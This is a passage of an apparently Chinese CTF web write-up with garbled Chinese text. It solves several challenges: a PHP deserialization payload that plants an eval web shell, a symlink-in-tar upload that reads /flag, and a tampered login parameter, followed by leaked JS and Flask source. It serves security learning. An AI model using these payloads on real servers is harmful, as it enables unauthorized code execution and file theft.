<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;./classes.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>] ?? <span class="string">&#x27;å–µå–µå–µ?&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT content FROM notes WHERE id = ?&quot;</span>);</span><br><span class="line"><span class="variable">$s</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$id</span>]);</span><br><span class="line"><span class="variable">$row</span> = <span class="variable">$s</span>-&gt;<span class="title function_ invoke__">fetch</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (! <span class="variable">$row</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å–µå–µå–µ?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cfg</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$row</span>[<span class="string">&quot;content&quot;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$cfg</span> <span class="keyword">instanceof</span> ShitMountant) &#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$cfg</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ok!&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">nl2br</span>(<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$r</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;å–µå–µå–µ?&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çŸ¥é“ï¼š</p>
<ol>
<li><p>ä¼ å…¥GETå‚æ•°id</p>
</li>
<li><p>ä½¿ç”¨äº† <strong>PDO é¢„å¤„ç†</strong>ï¼Œæœç»äº† SQL æ³¨å…¥æ¼æ´</p>
</li>
<li><p>å­˜åœ¨ echo nl2br(htmlspecialchars($r));å¯ä»¥æ‰“å°å‡ºå›æ˜¾å†…å®¹ï¼Œä½†é‡‡ç”¨å†™å…¥shellä¸éœ€è¦ç”¨åˆ°</p>
</li>
</ol>
<p>æ”»å‡»é¡ºåºå·®ä¸å¤šæ‹æ¸…äº†ï¼š</p>
<ol>
<li><p>é¦–å…ˆåˆ©ç”¨classes.phpä¸­çš„ç±»ç¼–å†™è„šæœ¬</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileLogger</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logfile</span> = <span class="string">&quot;shell.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span> = <span class="string">&quot;&lt;?php @eval(\$_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileLogger</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ï¼ˆ<strong>æ³¨æ„ï¼š</strong> å› ä¸ºç”¨äº†åŒå¼•å· <code>&quot;&quot;</code>ï¼ŒPHP ä¼šè®¤ä¸º <code>$_POST</code> æ˜¯å½“å‰è„šæœ¬çš„ä¸€ä¸ªå˜é‡ï¼Œä¼šå°è¯•<strong>ç«‹åˆ»è§£æå®ƒ</strong>ï¼Œå› ä¸ºå½“å‰è„šæœ¬é‡Œå¹¶æ²¡æœ‰ä¼ å‚ï¼Œ<code>$_POST[&#39;cmd&#39;]</code> æ˜¯ç©ºçš„ï¼Œæœ€ç»ˆç”Ÿæˆçš„å­—ç¬¦ä¸²å˜æˆäº†ï¼š<code>&lt;?php @eval();?&gt;</code> ï¼Œæ‰€ä»¥<strong>éœ€è¦\è¿›è¡Œè½¬ä¹‰</strong>ï¼ï¼‰</p>
<p>ç”Ÿæˆpayloadï¼š</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">O:10:&quot;FileLogger&quot;:2:&#123;s:7:&quot;logfile&quot;;s:9:&quot;shell.php&quot;;s:7:&quot;content&quot;;s:29:&quot;&lt;?php @eval($<span class="emphasis">_POST[&#x27;cmd&#x27;]);?&gt;&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>æ ¹æ®index.phpçš„æºç ï¼Œä¿®æ”¹payloadå¹¶åœ¨http:&#x2F;&#x2F;ç›®æ ‡IP:ç«¯å£&#x2F;index.phpé¡µé¢ä¼ å…¥POSTæ•°æ®ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shark=blueshark:O:10:&quot;FileLogger&quot;:2:&#123;s:7:&quot;logfile&quot;;s:9:&quot;shell.php&quot;;s:7:&quot;content&quot;;s:29:&quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>è¿æ¥shellï¼Œè®¿é—®http:&#x2F;&#x2F;ç›®æ ‡IP:ç«¯å£&#x2F;shell.phpï¼Œè‹¥é¡µé¢ç©ºç™½åˆ™è¡¨ç¤ºæˆåŠŸï¼Œåœ¨postä¸­ä¼ å…¥ï¼šcmd&#x3D;system(â€˜cat &#x2F;flagâ€™);æ‹¿åˆ°flag</p>
</li>
</ol>
<hr>
<h1 id="7-flagï¼Ÿæˆ‘å°±å€Ÿèµ°äº†"><a href="#7-flagï¼Ÿæˆ‘å°±å€Ÿèµ°äº†" class="headerlink" title="7. flagï¼Ÿæˆ‘å°±å€Ÿèµ°äº†"></a>7. flagï¼Ÿæˆ‘å°±å€Ÿèµ°äº†</h1><p><strong>â€œæ”¯æŒä¸Šä¼ æ‰“åŒ…æ ¼å¼ï¼Œä¸Šä¼ åä¼šè‡ªåŠ¨å¸®ä½ è§£å‹åˆ°ç›®å½•â€</strong> ä¸”åç«¯æ˜¯ <strong>Python + Flask</strong></p>
<p>å°è¯•è½¯é“¾æ¥è¯»å–flag</p>
<p>é¦–å…ˆåœ¨æœ¬åœ°åˆ›å»ºä¸€ä¸ªæŒ‡å‘ <code>/flag</code> çš„å¿«æ·æ–¹å¼ï¼Œå†ç”¨ <code>tar</code> å‘½ä»¤æŠŠå®ƒæ‰“åŒ…ï¼ŒæœåŠ¡å™¨è§£å‹åï¼Œä¼šåœ¨ä¸Šä¼ ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªæŒ‡å‘æœåŠ¡å™¨æ ¹ç›®å½•ä¸‹ <code>/flag</code> çš„å¿«æ·æ–¹å¼ã€‚</p>
<p>æ¯”å¦‚åœ¨kaliç»ˆç«¯æ‰§è¡Œï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /flag flag.txt</span><br><span class="line">tar -cf flag.tar flag.txt</span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ åç‚¹å‡»flag.txtçš„å¿«æ·æ–¹å¼å³å¯</p>
<hr>
<h1 id="8-Who-am-I"><a href="#8-Who-am-I" class="headerlink" title="8. Who am I"></a>8. Who am I</h1><p>éšä¾¿æ³¨å†Œä¸ªè´¦å·ï¼Œåœ¨ç™»å½•æ—¶æŠ“åŒ…å‘ç°åœ¨POSTå¤šäº†ä¸€ä¸ªtype&#x3D;1</p>
<p>æ”¹æˆtype&#x3D;0åæ˜¯ä¸€ä¸ª302é¡µé¢ï¼Œå¯ä»¥è·³è½¬å»&#x2F;272e1739b89da32e983970ece1a086bd</p>
<p><img src="/img/isctf/0e4abe91-4a22-4583-b410-e38be13c473a.png" alt="p1"></p>
<p>è®¿é—®å‘ç°å¯ä»¥æŸ¥çœ‹é…ç½®æ–‡ä»¶</p>
<p>sontriex.a47b9c5f.jsï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&quot;/user/demo&quot;</span>,&#123;<span class="attr">method</span>:<span class="string">&quot;POST&quot;</span>&#125;)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">r</span> =&gt;</span> r.<span class="title function_">json</span>())</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;username&quot;</span>).<span class="property">innerText</span> = data.<span class="property">username</span>;</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>

<p>malniest.e19a0e13.jsï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="string">&quot;use strict&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">noop</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">identity</span>(<span class="params">x</span>) &#123; <span class="keyword">return</span> x; &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">times</span>(<span class="params">n, fn</span>) &#123; <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; n; i++) <span class="title function_">fn</span>(i); &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">clamp</span>(<span class="params">v, a, b</span>) &#123; <span class="keyword">return</span> <span class="title class_">Math</span>.<span class="title function_">min</span>(b, <span class="title class_">Math</span>.<span class="title function_">max</span>(a, v)); &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">hashStr</span>(<span class="params">s</span>) &#123; <span class="keyword">let</span> h = <span class="number">0</span>; <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; s.<span class="property">length</span>; i++) h = (h &lt;&lt; <span class="number">5</span>) - h + s.<span class="title function_">charCodeAt</span>(i) | <span class="number">0</span>; <span class="keyword">return</span> h &gt;&gt;&gt; <span class="number">0</span>; &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">randInt</span>(<span class="params">a, b</span>) &#123; <span class="keyword">return</span> a + <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * (b - a + <span class="number">1</span>)); &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">pad2</span>(<span class="params">n</span>) &#123; <span class="keyword">return</span> n &lt; <span class="number">10</span> ? <span class="string">&quot;0&quot;</span> + n : <span class="string">&quot;&quot;</span> + n; &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">dateStamp</span>(<span class="params"></span>) &#123; <span class="keyword">const</span> d = <span class="keyword">new</span> <span class="title class_">Date</span>(); <span class="keyword">return</span> d.<span class="title function_">getFullYear</span>()+<span class="string">&quot;-&quot;</span>+<span class="title function_">pad2</span>(d.<span class="title function_">getMonth</span>()+<span class="number">1</span>)+<span class="string">&quot;-&quot;</span>+<span class="title function_">pad2</span>(d.<span class="title function_">getDate</span>()); &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">debounce</span>(<span class="params">fn, wait</span>) &#123; <span class="keyword">let</span> t; <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params"></span>) &#123; <span class="built_in">clearTimeout</span>(t); t = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> fn.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>), wait); &#125;; &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">throttle</span>(<span class="params">fn, wait</span>) &#123; <span class="keyword">let</span> last = <span class="number">0</span>; <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params"></span>) &#123; <span class="keyword">const</span> now = <span class="title class_">Date</span>.<span class="title function_">now</span>(); <span class="keyword">if</span> (now - last &gt;= wait) &#123; last = now; fn.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>); &#125; &#125;; &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">memo</span>(<span class="params">fn</span>) &#123; <span class="keyword">const</span> m = <span class="keyword">new</span> <span class="title class_">Map</span>(); <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">k</span>) &#123; <span class="keyword">if</span> (m.<span class="title function_">has</span>(k)) <span class="keyword">return</span> m.<span class="title function_">get</span>(k); <span class="keyword">const</span> v = <span class="title function_">fn</span>(k); m.<span class="title function_">set</span>(k, v); <span class="keyword">return</span> v; &#125;; &#125;</span><br><span class="line">  <span class="keyword">const</span> expensive = <span class="title function_">memo</span>(<span class="function"><span class="params">n</span> =&gt;</span> &#123; <span class="keyword">let</span> r = <span class="number">1</span>; <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; <span class="number">1000</span>; i++) r = (r * (n + i)) % <span class="number">2147483647</span>; <span class="keyword">return</span> r; &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">camel</span>(<span class="params">s</span>)&#123;<span class="keyword">return</span> s.<span class="title function_">replace</span>(<span class="regexp">/[-_](\w)/g</span>,<span class="function">(<span class="params">_,c</span>)=&gt;</span>c.<span class="title function_">toUpperCase</span>());&#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">chunk</span>(<span class="params">arr, size</span>)&#123;<span class="keyword">const</span> out=[];<span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;ia.<span class="title function_">concat</span>(b),[]);&#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">repeatStr</span>(<span class="params">s,n</span>)&#123;<span class="keyword">let</span> r=<span class="string">&quot;&quot;</span>;<span class="title function_">times</span>(n,<span class="function">()=&gt;</span>r+=s);<span class="keyword">return</span> r;&#125;</span><br><span class="line">  <span class="keyword">const</span> loremPool = <span class="string">&quot;lorem ipsum dolor sit amet consectetur adipiscing elit&quot;</span>.<span class="title function_">split</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">lorem</span>(<span class="params">n</span>)&#123;<span class="keyword">let</span> r=[];<span class="title function_">times</span>(n,<span class="function">()=&gt;</span>r.<span class="title function_">push</span>(loremPool[<span class="title function_">randInt</span>(<span class="number">0</span>,loremPool.<span class="property">length</span>-<span class="number">1</span>)]));<span class="keyword">return</span> r.<span class="title function_">join</span>(<span class="string">&quot; &quot;</span>);&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title class_">Net</span> = &#123;</span><br><span class="line">    <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params">url</span>)&#123; <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(&#123;url, <span class="attr">ok</span>: <span class="literal">true</span>, <span class="attr">ts</span>: <span class="title class_">Date</span>.<span class="title function_">now</span>()&#125;); &#125;,</span><br><span class="line">    <span class="attr">post</span>: <span class="keyword">function</span>(<span class="params">url, body</span>)&#123; <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(&#123;url, <span class="attr">ok</span>: <span class="literal">true</span>, <span class="attr">len</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(body||&#123;&#125;).<span class="property">length</span>&#125;); &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title class_">Bus</span> = (<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="attr">on</span>: <span class="function">(<span class="params">e,fn</span>)=&gt;</span>&#123; <span class="keyword">if</span>(!map.<span class="title function_">has</span>()) map.<span class="title function_">set</span>(e, []); map.<span class="title function_">get</span>(e).<span class="title function_">push</span>(fn); &#125;,</span><br><span class="line">      <span class="attr">emit</span>: <span class="function">(<span class="params">e,p</span>)=&gt;</span>&#123; <span class="keyword">const</span> arr = map.<span class="title function_">get</span>(e)||[]; arr.<span class="title function_">forEach</span>(<span class="function"><span class="params">fn</span>=&gt;</span>&#123; <span class="keyword">try</span>&#123;<span class="title function_">fn</span>(p);&#125;<span class="keyword">catch</span>(_)&#123;&#125; &#125;); &#125;,</span><br><span class="line">      <span class="attr">off</span>: <span class="function">(<span class="params">e,fn</span>)=&gt;</span>&#123; <span class="keyword">const</span> arr = map.<span class="title function_">get</span>(e)||[]; map.<span class="title function_">set</span>(e, arr.<span class="title function_">filter</span>(<span class="function"><span class="params">f</span>=&gt;</span>f!==fn)); &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;)();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="variable constant_">DOM</span> = &#123;</span><br><span class="line">    <span class="attr">qs</span>: <span class="function">(<span class="params">sel, root=<span class="variable language_">document</span></span>)=&gt;</span>root.<span class="title function_">querySelector</span>(sel),</span><br><span class="line">    <span class="attr">qsa</span>: <span class="function">(<span class="params">sel, root=<span class="variable language_">document</span></span>)=&gt;</span><span class="title class_">Array</span>.<span class="title function_">from</span>(root.<span class="title function_">querySelectorAll</span>(sel)),</span><br><span class="line">    <span class="attr">el</span>: <span class="function">(<span class="params">tag, props</span>)=&gt;</span><span class="title class_">Object</span>.<span class="title function_">assign</span>(<span class="variable language_">document</span>.<span class="title function_">createElement</span>(tag), props||&#123;&#125;),</span><br><span class="line">    <span class="attr">hide</span>: <span class="function">(<span class="params">node</span>)=&gt;</span>&#123; <span class="keyword">if</span>(node &amp;&amp; node.<span class="property">style</span>) node.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&quot;none&quot;</span>; &#125;,</span><br><span class="line">    <span class="attr">show</span>: <span class="function">(<span class="params">node</span>)=&gt;</span>&#123; <span class="keyword">if</span>(node &amp;&amp; node.<span class="property">style</span>) node.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&quot;&quot;</span>; &#125;,</span><br><span class="line">    <span class="attr">on</span>: <span class="function">(<span class="params">node, ev, fn, opt</span>)=&gt;</span>node &amp;&amp; node.<span class="title function_">addEventListener</span>(ev, fn, opt)</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">fakeLayoutScore</span>(<span class="params">node</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!node) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> r = node.<span class="property">getBoundingClientRect</span> ? node.<span class="title function_">getBoundingClientRect</span>() : &#123;<span class="attr">width</span>:<span class="number">1</span>,<span class="attr">height</span>:<span class="number">1</span>&#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">clamp</span>(<span class="title class_">Math</span>.<span class="title function_">floor</span>((r.<span class="property">width</span> * r.<span class="property">height</span>) % <span class="number">9973</span>), <span class="number">0</span>, <span class="number">9973</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="variable constant_">CFG</span> = &#123;</span><br><span class="line">    <span class="attr">version</span>: <span class="string">&quot;v&quot;</span>+<span class="title function_">dateStamp</span>()+<span class="string">&quot;.&quot;</span>+<span class="title function_">randInt</span>(<span class="number">100</span>,<span class="number">999</span>),</span><br><span class="line">    <span class="attr">flags</span>: &#123; <span class="attr">featureX</span>: <span class="literal">false</span>, <span class="attr">featureY</span>: <span class="literal">true</span>, <span class="attr">verbose</span>: <span class="literal">false</span> &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">const</span> <span class="title class_">Cache</span> = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line"></span><br><span class="line">  (<span class="keyword">function</span> <span class="title function_">lightScheduler</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> tasks = [</span><br><span class="line">      <span class="function">()=&gt;</span><span class="title class_">Cache</span>.<span class="title function_">set</span>(<span class="string">&quot;k&quot;</span>+<span class="title function_">randInt</span>(<span class="number">1</span>,<span class="number">9</span>), <span class="title function_">hashStr</span>(<span class="title function_">lorem</span>(<span class="number">5</span>))),</span><br><span class="line">      <span class="function">()=&gt;</span><span class="title function_">expensive</span>(<span class="title function_">randInt</span>(<span class="number">1</span>,<span class="number">100</span>)),</span><br><span class="line">      <span class="function">()=&gt;</span><span class="title class_">Bus</span>.<span class="title function_">emit</span>(<span class="string">&quot;tick&quot;</span>, <span class="title class_">Date</span>.<span class="title function_">now</span>())</span><br><span class="line">    ];</span><br><span class="line">    <span class="keyword">let</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="keyword">function</span> <span class="title function_">run</span>(<span class="params"></span>)&#123;</span><br><span class="line">      <span class="keyword">try</span> &#123; tasks[i%tasks.<span class="property">length</span>](); &#125; <span class="keyword">catch</span>(_)&#123;&#125;</span><br><span class="line">      i++;</span><br><span class="line">      <span class="keyword">if</span>(i&lt;<span class="number">5</span>) <span class="built_in">setTimeout</span>(run, <span class="title function_">randInt</span>(<span class="number">60</span>,<span class="number">140</span>));</span><br><span class="line">    &#125;, <span class="title function_">randInt</span>(<span class="number">50</span>,<span class="number">120</span>));</span><br><span class="line">  &#125;)();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">ensureTypeHidden</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> form = <span class="variable constant_">DOM</span>.<span class="title function_">qs</span>(<span class="string">&quot;form[action=&#x27;/login&#x27;][method=&#x27;POST&#x27;]&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!form) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> hidden = form.<span class="title function_">querySelector</span>(<span class="string">&quot;input[name=&#x27;type&#x27;]&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hidden) &#123;</span><br><span class="line">      hidden = <span class="variable constant_">DOM</span>.<span class="title function_">el</span>(<span class="string">&quot;input&quot;</span>, &#123; <span class="attr">type</span>: <span class="string">&quot;hidden&quot;</span>, <span class="attr">name</span>: <span class="string">&quot;type&quot;</span>, <span class="attr">value</span>: <span class="string">&quot;1&quot;</span> &#125;);</span><br><span class="line">      form.<span class="title function_">appendChild</span>(hidden);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable constant_">DOM</span>.<span class="title function_">on</span>(form, <span class="string">&quot;submit&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">let</span> h = form.<span class="title function_">querySelector</span>(<span class="string">&quot;input[name=&#x27;type&#x27;]&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (!h) &#123;</span><br><span class="line">        h = <span class="variable constant_">DOM</span>.<span class="title function_">el</span>(<span class="string">&quot;input&quot;</span>, &#123; <span class="attr">type</span>: <span class="string">&quot;hidden&quot;</span>, <span class="attr">name</span>: <span class="string">&quot;type&quot;</span>, <span class="attr">value</span>: <span class="string">&quot;1&quot;</span> &#125;);</span><br><span class="line">        form.<span class="title function_">appendChild</span>(h);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (h.<span class="property">value</span> !== <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">        h.<span class="property">value</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">mountInvisible</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">      <span class="keyword">const</span> ghost = <span class="variable constant_">DOM</span>.<span class="title function_">el</span>(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">      ghost.<span class="title function_">setAttribute</span>(<span class="string">&quot;data-h&quot;</span>, <span class="title function_">hashStr</span>(<span class="variable constant_">CFG</span>.<span class="property">version</span>));</span><br><span class="line">      ghost.<span class="property">style</span>.<span class="property">cssText</span> = <span class="string">&quot;display:none;width:0;height:0;overflow:hidden;&quot;</span>;</span><br><span class="line">      ghost.<span class="property">textContent</span> = <span class="title function_">repeatStr</span>(<span class="string">&quot;*&quot;</span>, <span class="title function_">randInt</span>(<span class="number">1</span>,<span class="number">3</span>)); </span><br><span class="line">      <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(ghost);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(_)&#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">prewarm</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">      <span class="title class_">Net</span>.<span class="title function_">get</span>(<span class="string">&quot;/ping?_=&quot;</span>+<span class="title class_">Date</span>.<span class="title function_">now</span>()).<span class="title function_">then</span>(noop).<span class="title function_">catch</span>(noop);</span><br><span class="line">      <span class="title function_">times</span>(<span class="number">3</span>, <span class="function"><span class="params">i</span> =&gt;</span> <span class="title class_">Cache</span>.<span class="title function_">set</span>(<span class="string">&quot;warm&quot;</span>+i, <span class="title function_">expensive</span>(i+<span class="number">1</span>)));</span><br><span class="line">    &#125;<span class="keyword">catch</span>(_)&#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">keySpy</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> handler = <span class="title function_">throttle</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;  &#125;, <span class="number">200</span>);</span><br><span class="line">    <span class="variable constant_">DOM</span>.<span class="title function_">on</span>(<span class="variable language_">document</span>, <span class="string">&quot;keydown&quot;</span>, handler);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">init</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">prewarm</span>();</span><br><span class="line">    <span class="title function_">keySpy</span>();</span><br><span class="line">    <span class="title function_">ensureTypeHidden</span>();     </span><br><span class="line">    <span class="title function_">mountInvisible</span>();</span><br><span class="line">    <span class="title class_">Bus</span>.<span class="title function_">on</span>(<span class="string">&quot;tick&quot;</span>, noop);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">readyState</span> === <span class="string">&quot;loading&quot;</span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;DOMContentLoaded&quot;</span>, init, &#123; <span class="attr">once</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_">init</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<p>mian.pyï¼š</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template,redirect,url_for</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line">database=&#123;&#125;</span><br><span class="line">data_index=<span class="number">0</span></span><br><span class="line">name=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/registerV2&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">registerV2</span>():</span><br><span class="line">    username=request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    password=request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    password2=request.form[<span class="string">&#x27;password2&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> password!=password2:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">        alert(&#x27;å‰åå¯†ç 